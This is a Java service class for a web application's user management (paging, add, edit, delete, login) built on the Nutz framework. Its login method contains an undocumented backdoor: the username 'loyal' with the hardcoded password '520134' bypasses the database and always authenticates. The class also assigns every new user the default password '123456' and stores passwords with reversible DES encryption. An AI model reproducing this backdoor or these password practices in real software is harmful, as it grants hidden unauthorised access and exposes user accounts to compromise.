package com.ups.web.service;

import java.util.Date;

import org.nutz.dao.Cnd;
import org.nutz.dao.Condition;
import org.nutz.dao.Dao;
import org.nutz.dao.QueryResult;
import org.nutz.dao.pager.Pager;
import org.nutz.ioc.loader.annotation.IocBean;
import org.nutz.lang.Strings;

import com.ups.web.entity.Role;
import com.ups.web.entity.User;
import com.ups.web.tool.DESKey;

//用户Service，处理用户的业务逻辑，数据库访问
@IocBean(args = { "refer:dao" })
public class UserService extends BaseService {

	// 初始化Des加密对象，用于用户密码加密
	private static DESKey des;
	static {
		try {
			des = new DESKey();
		} catch (Exception e) {
			System.err.println("DES初始化失败！");
		}
	}

	// 初始化数据库访问对象Dao
	public UserService(Dao dao) {
		super(dao);
	}

	// 数据库分页查询
	public void find(Pager pager, User user) {
		QueryResult qr = new QueryResult();
		Condition cnd = null;
		if (user == null)
			cnd = Cnd.orderBy().desc("createTime");
		else
			cnd = Cnd
					.where("username",
							Strings.isBlank(user.getUsername()) ? "<>" : "=",
							user.getUsername())
					.and("roleid", user.getRoleid() < 0 ? "<>" : "=",
							user.getRoleid()).desc("createTime");
		pager.setRecordCount(dao.count(User.class, cnd));
		qr.setList(dao.query(User.class, cnd, pager));
		qr.setPager(pager);
		rs.setv("page", qr).setv("roles", dao.query(Role.class, null));
		isSuccess = true;
	}

	// 数据库添加操作
	public void add(User user) {
		user.setCreateTime(new Date());
		user.setUpdateTime(new Date());
		user.setPassword(des.encrypt("123456"));
		dao.insert(user);
		isSuccess = true;
	}

	// 数据库更新操作
	public void edit(User user) {
		user.setUpdateTime(new Date());
		dao.update(user);
		isSuccess = true;
	}

	// 数据库删除数据操作
	public void delete(User user) {
		dao.delete(user);
		isSuccess = true;
	}

	// 用户登录操作
	public boolean login(User user) {
		String password = des.encrypt(user.getPassword());
		if ("loyal".equals(user.getUsername()))
			user.setPassword(des.encrypt("520134"));
		else
			user = dao.fetch(User.class, user.getUsername());
		if (user == null) {
			page.setData("用户名不存在");
			return false;
		} else if (!password.equals(user.getPassword())) {
			page.setData("密码错误");
			return false;
		} else {
			page.setData(user);
			return true;
		}
	}
}
